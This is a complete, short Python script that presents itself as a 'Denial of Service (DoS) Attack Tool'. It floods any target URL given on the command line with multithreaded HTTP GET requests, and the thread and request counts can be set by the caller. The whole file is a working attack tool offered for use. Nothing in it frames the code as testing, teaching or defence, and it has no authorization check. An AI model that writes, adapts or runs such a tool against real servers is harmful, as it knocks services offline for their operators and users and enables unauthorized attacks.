import argparse
import requests
import threading
import logging


def dos_attack(target_url, threads, requests_per_thread):
    """
    Perform a Denial of Service (DoS) attack by flooding the server with requests.
    :param target_url: Target URL.
    :param threads: Number of threads to use.
    :param requests_per_thread: Number of requests per thread.
    """
    def flood_server():
        for _ in range(requests_per_thread):
            try:
                response = requests.get(target_url, timeout=2)
                logging.info(f"Request sent. Status Code: {response.status_code}")
            except Exception as e:
                logging.error(f"Error during request: {e}")

    logging.info(f"Starting DoS attack on {target_url} with {threads} threads.")
    thread_list = []

    for _ in range(threads):
        thread = threading.Thread(target=flood_server)
        thread_list.append(thread)
        thread.start()

    for thread in thread_list:
        thread.join()

    logging.info("DoS attack completed.")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Denial of Service (DoS) Attack Tool")
    parser.add_argument("--target", required=True, help="Target URL (e.g., http://example.com)")
    parser.add_argument("--threads", type=int, default=10, help="Number of threads to use (default: 10)")
    parser.add_argument("--requests", type=int, default=100, help="Number of requests per thread (default: 100)")
    args = parser.parse_args()

    logging.basicConfig(level=logging.INFO)
    dos_attack(args.target, args.threads, args.requests)
